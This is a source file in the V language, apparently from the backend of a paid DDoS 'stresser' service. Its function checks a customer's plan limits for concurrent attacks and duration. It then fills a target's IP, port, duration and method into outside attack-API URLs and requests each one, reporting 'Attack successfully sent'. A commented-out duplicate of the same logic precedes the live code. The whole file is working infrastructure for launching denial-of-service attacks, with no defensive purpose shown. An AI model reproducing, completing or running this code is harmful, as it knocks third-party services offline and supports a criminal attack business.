module attack_system

import mysql
import net.http

import crud

pub fn wfx_send_api_attack(ip string, port string, time string, method string, user_info map[string]string, mut sql mysql.Connection, api_names []string, api_urls []string) {
	send_api_attack(ip, port, time, method, user_info, mut sql, api_names, api_urls)
}

pub fn send_api_attack(ip string, port string, time string, method string, user_info map[string]string, mut sql mysql.Connection, api_names []string, api_urls []string) string {
	// mut attack_msg := ""
	// if user_info['ongoing'] < user_info['conn'] {
	// 	if time.int() < user_info['maxtime'].int() {
	// 		for i, api in api_urls {
	// 			mut fixed := api.replace("[HOST]", ip)
	// 			fixed = fixed.replace("[PORT]", port)
	// 			fixed = fixed.replace("[TIME]", time)
	// 			fixed = fixed.replace("[METHOD]", method)
	// 			attack_msg += "[+] Attack successfully sent to ${ip}:${port} for {$time} seconds with ${method} on ${api_names[i]}\r\n"
	// 			http.get_text(fixed)
	// 		}
	// 	} else {
	// 		return "[x] Error, You tried to attack an IP over the your maxtime plan. Try again with a lower time count\r\n"
	// 	}
	// } else {
	// 	return "[x] Error, You have reached you're maximum concurrents. Please wait to send attack again....\r\n"
	// }
	// return attack_msg

	mut attack_msg := ""
	if user_info['ongoing'] < user_info['conn'] {
		if time.int() < user_info['maxtime'].int() {
			for i, api in api_urls {
				println(api)
				mut fixed := api.replace("[HOST]", ip)
				fixed = fixed.replace("[PORT]", port)
				fixed = fixed.replace("[TIME]", time)
				fixed = fixed.replace("[METHOD]", method)
				attack_msg += "[+] Attack successfully sent to ${ip}:${port} for {$time} seconds with ${method} on ${api_names[i]}\r\n"
				lul := http.get_text(fixed)
				println(lul)
			}
		} else {
			return "[x] Error, You tried to attack an IP over the your maxtime plan. Try again with a lower time count\r\n"
		}
	} else {
		return "[x] Error, You have reached you're maximum concurrents. Please wait to send attack again....\r\n"
	}
	return attack_msg
}